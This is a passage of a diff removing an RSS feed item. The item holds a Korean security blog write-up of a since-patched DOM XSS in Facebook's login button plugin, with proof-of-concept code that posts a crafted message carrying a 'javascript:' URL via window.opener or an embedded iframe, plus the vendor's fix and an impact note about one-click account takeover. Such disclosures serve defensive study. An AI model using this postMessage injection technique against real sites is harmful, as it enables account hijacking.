-        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xdArbiterHandleMessage&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;loginButtonStateInit&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;javascript:alert(document.domain);&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;dims&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenX&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenY&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;outerWidth&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;outerHeight&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;971&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenWidth&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}})},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;origin&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ORIGIN&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;opener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;4000&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;2-iframe-method&quot;&gt;2. Iframe Method&lt;/h3&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; 또는 CSP &lt;code class=&quot;highlighter-rouge&quot;&gt;frame-ancestors&lt;/code&gt; 헤더가 누락 되었으므로 이 페이지는 공격자의 페이지에 쉽게 포함될 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fbFrameLoaded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iframeEl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;fbframe&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xdArbiterHandleMessage&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;loginButtonStateInit&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;javascript:alert(document.domain);&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;dims&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenX&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenY&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;outerWidth&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;outerHeight&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;971&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;screenWidth&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}})},&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;origin&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ORIGIN&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;iframeEl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contentWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fbframe&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;amp;auto_logout_link=false&amp;amp;button_type=continue_with&amp;amp;channel=REDIRECT_URL&amp;amp;container_width=734&amp;amp;locale=en_US&amp;amp;sdk=joey&amp;amp;size=large&amp;amp;use_continue_as=true&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onload=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fbFrameLoaded(this)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;iframe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;fix&quot;&gt;Fix&lt;/h2&gt;
-
-&lt;p&gt;Facebook은 &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt; 파라미터에 정규식 검사를 추가하여 domain과 schema가 존재하는지 확인하는 방법으로 패치했습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;isFacebookURI&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;XOAuthErrorController&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getURIBuilder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setEnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;error_code&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;PLATFORM__INVALID_URL&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getURI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h2&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://youtu.be/KAnuFy2F7QA&quot;&gt;https://youtu.be/KAnuFy2F7QA&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;impact&quot;&gt;Impact&lt;/h2&gt;
-
-&lt;p&gt;잘못된 post message 설정 때문에 누군가는 공격자의 웹세이트에 접속하고 페이스북으로 로그인하기 버튼을 클&lt;/p&gt;
-
-&lt;p&gt;릭함으로써 &lt;a href=&quot;http://facebook.com&quot;&gt;facebook.com&lt;/a&gt; 도메인에 XSS가 발생하고 &lt;strong&gt;한 번의 클릭 만으로 계정을 탈취&lt;/strong&gt; 할 수 있습니다.&lt;/p&gt;
-</description>
-        <pubDate>Fri, 01 May 2020 00:00:00 +0000</pubDate>
-        <link>http://202.182.127.225:4000/2020-05-01/iframe-broker-Story-of-Facebook-DOM-XSS</link>
-        <guid isPermaLink="true">http://202.182.127.225:4000/2020-05-01/iframe-broker-Story-of-Facebook-DOM-XSS</guid>
-        
-        <category>web</category>
         
         
       </item>
